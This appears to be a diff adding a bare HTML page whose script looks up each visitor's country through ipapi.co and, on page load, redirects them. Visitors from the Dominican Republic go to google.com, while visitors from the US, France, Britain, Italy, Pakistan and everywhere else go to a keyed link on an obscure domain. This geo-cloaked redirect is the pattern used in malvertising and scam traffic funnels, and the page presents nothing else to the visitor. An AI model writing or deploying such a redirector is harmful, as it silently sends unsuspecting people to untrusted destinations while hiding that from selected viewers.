@@ -1,0 +1,37 @@
+<html>
+  <head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+  <body>
+<script>
+// Coutry Links
+var deFault = 'https://bilateralgodmother.com/nhxizn0b?key=2690890d17161c9ffef117fa30544aaa';
+var dO = 'https://www.google.com/';
+var uS = ' https://bilateralgodmother.com/nhxizn0b?key=2690890d17161c9ffef117fa30544aaa';
+var fR = ' https://bilateralgodmother.com/nhxizn0b?key=2690890d17161c9ffef117fa30544aaa';
+var gB = ' https://bilateralgodmother.com/nhxizn0b?key=2690890d17161c9ffef117fa30544aaa';
+var iT = ' https://bilateralgodmother.com/nhxizn0b?key=2690890d17161c9ffef117fa30544aaa';
+var pK = ' https://bilateralgodmother.com/nhxizn0b?key=2690890d17161c9ffef117fa30544aaa';
+
+
+// Countries Redirect 
+$.get('https://ipapi.co/country/', (data)=>{
+switch (data) { 
+  case 'DO': window.location.href = dO;
+  break 	
+  case 'US': window.location.href = uS;
+  break 	
+  case 'FR': window.location.href = fR;
+  break 
+  case 'GB': window.location.href = gB;
+  break
+  case 'IT': window.location.href = iT;
+  break
+  case 'PK': window.location.href = pK;
+  break
+ 	
+  default: window.location.href = deFault;
+  
+}
+});
+</script>
